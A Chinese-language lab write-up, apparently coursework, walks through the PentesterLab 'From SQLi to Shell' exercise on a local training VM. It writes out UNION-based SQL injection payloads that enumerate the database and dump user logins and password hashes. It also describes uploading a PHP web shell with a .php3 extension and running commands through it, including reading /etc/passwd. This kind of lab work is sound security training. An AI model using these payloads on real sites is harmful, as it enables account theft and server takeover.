## SQL注入

### 1.实验环境

- 攻击者主机kali(10.0.2.4) 

![8](image\8.png)

- 服务器（10.0.2.7）

从https://pentesterlab.com/exercises/from_sqli_to_shell下载ios镜像并安装

![9](image\9.png)

- 主机能ping通服务器

![10](image/10.png)

- 扫描能到达的ip

![11](image/11.png)

### 2.端口扫描

- nmap扫描端口

![](image/12.png)

### 3.SQL注入

- 查看源代码

![](image/13.png)

- 检查是否有sql漏洞

`cat.php?id=1`

`cat.php?id=2`

`cat.php?id=3`

![14](image\14.png)

![14](image\15.png)

![14](image\15.png)



![](image/17.png)

`cat.php?id=1'`

![](image/18.png)

`cat.php?id=1 and 1=1`

![](image/19.png)

![](image/20.png)

通过这个结果我们可以知道该网站存在sql注入漏洞

- 检查SQL数据库是否支持union查询

`cat.php?id=1 UNION SELECT 1`

`cat.php?id=1 UNION SELECT 1,2,3,4`

`cat.php?id=1 UNION SELECT 1，2，3，4，5`

通过这样的枚举，我们可以知道SQL查询对应的返回结果集合的列字段数量为4

![](image/21.png)

![](image/22.png)

![](image/23.png)

- 查看数据库版本信息

`cat.php?id=1 UNION SELECT 1,@@version,3,4`

![](image/24.png)

- 当前用户信息

`cat.php?id=1 UNION SELECT 1,@@current_user(),3,4`

![](image/25.png)

- 当前数据库信息

`cat.php?id=1 UNION SELECT 1,@@database(),3,4`

![](image/26.png)

- 查看所有表的列表

  `cat.php?id=1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables`

  ![](image/28.png)

- 查看所有列的表信息

`cat.php?id=1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns`

![](image/29.png)

- 连接表和列。在user表中看到有用户和密码列。

`cat.php?id=1 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns`

![](image/30.png)

- 获取密码

`cat.php?id=0 UNION SELECT 1,concat(id,':',login,':',password),3,4 FROM users`

![](image/31.png)

- 破解密码

![](image/32.png)

- 登陆账户

破解后用用户名和破解得到的密码登陆账户

然后进入可得到下列页面

![](image/33.png)

- 构建一个php文件

![](image/35.png)

- 上传文件

![](image/34.png)

![](image/36.png)

我们看到上面文件上传不成功，将文件后缀名改为php3后上传才能成功。

![](image/37.png)

- 查看内核

`admin/uploads/well.php3?cmd=uname`

![](image/38.png)

- 查看当前目录文件

`admin/uploads/well.php3?cmd=ls u`

![](image/39.png)

- 获取靶机的用户列表

`admin/uploads/well.php3?cmd=cat /etc/passwd`

![](image/40.png)